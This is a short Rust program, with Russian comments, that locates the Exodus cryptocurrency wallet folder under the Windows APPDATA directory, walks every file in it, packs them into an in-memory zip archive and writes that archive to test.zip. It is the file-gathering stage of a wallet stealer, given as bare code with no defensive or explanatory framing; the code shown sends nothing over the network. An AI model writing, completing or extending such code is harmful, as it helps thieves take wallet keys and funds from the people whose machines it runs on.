use std::collections::HashMap;
use std::fs::File;
use std::io::{self, Write};
use std::path::PathBuf;
use std::io::prelude::*;
use std::io::{Cursor, SeekFrom};
use zip::write::{FileOptions, ZipWriter};
use zip::CompressionMethod::Deflated;
use walkdir::WalkDir;

fn main() {
    let appdata = std::env::var("APPDATA").unwrap();
    let exodus_path = PathBuf::from(&appdata).join("Exodus/exodus.wallet");
    let mut wallets_path = HashMap::new();
    wallets_path.insert("Exodus", exodus_path);

    let mut buf = Cursor::new(Vec::new()); // Создаем буфер в памяти
    let options = FileOptions::default()
        .compression_method(Deflated)
        .unix_permissions(0o755);

    {
        let mut zip = ZipWriter::new(&mut buf); // Создаем архив в буфере памяти

        for entry in &wallets_path {
            for file_entry in WalkDir::new(&entry.1).into_iter().filter_map(|e| e.ok()) {
                let path = file_entry.path();
                if path.is_file() {
                    let mut file = File::open(&path).expect("Failed to open file");
                    let entry_path = path.strip_prefix(&entry.1).unwrap().to_str().unwrap();
                    zip.start_file(entry_path, options).unwrap();
                    io::copy(&mut file, &mut zip).expect("Failed to write file to archive");
                }
            }
        }
    }

    buf.seek(SeekFrom::Start(0)).unwrap(); // Сброс позиции курсора до начала
    write_zip_to_file(&mut buf)
        .expect("Failed to write zip to file");
}

fn write_zip_to_file<W: Write + Seek + Read>(zip_data: &mut W) -> io::Result<()> {
    let mut file = File::create("test.zip")?;
    io::copy(zip_data, &mut file)?;
    Ok(())
}